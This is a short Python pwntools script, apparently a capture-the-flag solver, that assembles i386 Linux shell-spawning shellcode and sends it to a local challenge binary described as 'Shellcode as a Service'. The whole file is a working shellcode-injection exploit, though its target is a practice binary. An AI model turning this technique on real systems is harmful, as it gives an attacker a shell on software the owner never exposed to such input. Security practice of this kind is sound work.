import pwn
from time import sleep

def main():
  pwn.context.arch = 'i386'
  pwn.context.binary = './chall'
  pwn.context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
  pwn.context.bits = 32

  proc = pwn.process()
  #pwn.gdb.attach(proc)
  #sleep(1)

  shellcraft = pwn.shellcraft.i386.linux.sh()
  print(shellcraft)
  shellcode = pwn.asm(shellcraft)

  #print(f'Sending shellcode: ', shellcode)
  proc.sendlineafter(b'Welcome to Shellcode as a Service!\n', shellcode)

  print(proc.readline())
  print(proc.readline())
  print(proc.readline())
  print(proc.readline())


  

if __name__ == '__main__':
  main()
